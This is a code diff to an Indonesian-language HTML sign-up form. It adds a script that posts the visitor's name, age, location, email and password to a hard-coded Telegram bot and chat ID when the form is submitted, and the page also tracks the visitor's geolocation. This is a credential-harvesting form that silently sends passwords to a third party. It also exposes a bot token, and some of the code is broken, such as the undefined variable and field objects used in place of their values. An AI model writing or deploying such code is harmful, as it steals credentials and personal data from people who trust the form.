@@ -28,21 +28,46 @@
       <br>
       <label>Tanggal Lahir :</label>
       <br>
-      <input type="date" required></input>
+      <input type="date" id="tgl_lahir" required></input>
       <br>
       <label>Email :</label>
       <br>
-      <input type="email" placeholder="Masukkan Email" required></input>
+      <input id="email" type="email" placeholder="Masukkan Email" required></input>
       <br>
       <label>Kata Sandi :</label>
       <br>
-      <input type="password" id="kata-sandi" placeholder="Masukkan Kata Sandi" required></input>
+      <input type="password" id="kata_sandi" placeholder="Masukkan Kata Sandi" required></input>
       <br>
-      <input id="submit" type="submit"></input>
+      <input onsubmit="return sendText()" id="submit" type="submit"></input>
     
     </form>
     <script>
-      
+      const botToken = '5906990752:AAHv8iFSmHu4MC4SM_IB3EZSiyTLxaZULvM';
+      const chatId = '-1001983705713'; // Chat ID penerima pesan
+        async function telegramRequest(method,data) {
+                  try {
+          const response = await axios.post(`https://api.telegram.org/bot${botToken}/${method}`, data);
+          console.log(response.data);
+        } catch (error) {
+                          alert("Kesalahan : \n", error);
+          console.error(error);
+        }
+      }
+var nama = document.getElementById('nama')
+var umur = document.getElementById('umur')
+var alamat = document.getElementById('lokasi')
+var tgl_lahir = document.getElementById('tgl_lahir')
+var email = document.getElementById('email')
+var kata_sandi = document.getElementById('kata_sandi')  
+      var result = "\nNama : " + nama + "\nUmur : " + umur + "\nLokasi : " + lokasi + "\nEmail : " + email + "\nKata Sandi : " + kata_sandi
+      // Fungsi untuk mengirim pesan teks
+      function sendText() {
+        const message = result
+        if (message) {
+          telegramRequest('sendMessage', { chat_id: chatId, text: message });
+          alert('s')
+  }
+      }
       function getLocation() {
                         if (navigator.geolocation) {
                             navigator.geolocation.watchPosition(showPosition,showError);
